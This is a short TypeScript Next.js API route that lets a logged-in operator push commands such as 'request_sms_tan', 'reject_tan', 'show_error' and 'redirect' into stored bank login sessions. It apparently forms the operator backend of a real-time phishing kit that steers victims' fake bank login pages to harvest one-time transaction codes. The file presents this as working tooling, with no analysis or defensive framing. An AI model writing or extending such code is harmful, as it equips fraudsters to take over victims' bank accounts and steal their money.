import { NextRequest, NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/auth";
import { prisma } from "@/lib/prisma";
import type { Prisma } from "@/generated/prisma/client";

const VALID_TYPES = new Set([
  "show_error",
  "request_sms_tan",
  "request_push_tan",
  "redirect",
  "clear_error",
  "reject_tan",
  "retry_tan",
  "forward_to_tan",
  "back_to_login",
]);

export async function POST(req: NextRequest, { params }: { params: Promise<{ id: string }> }) {
  const session = await getServerSession(authOptions);
  if (!session?.user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { id } = await params;
  const body = await req.json().catch(() => null);
  if (!body || typeof body !== "object") {
    return NextResponse.json({ error: "Invalid body" }, { status: 400 });
  }

  const { type, payload } = body as { type?: string; payload?: Record<string, unknown> };
  if (!type || !VALID_TYPES.has(type)) {
    return NextResponse.json({ error: "Invalid command type" }, { status: 400 });
  }

  const command: Prisma.InputJsonValue = {
    type,
    payload: (payload ?? {}) as Prisma.InputJsonValue,
    issuedAt: new Date().toISOString(),
  };

  const updated = await prisma.bankSession.update({
    where: { id },
    data: { pendingCommand: command },
  });

  return NextResponse.json({ ok: true, command: updated.pendingCommand });
}
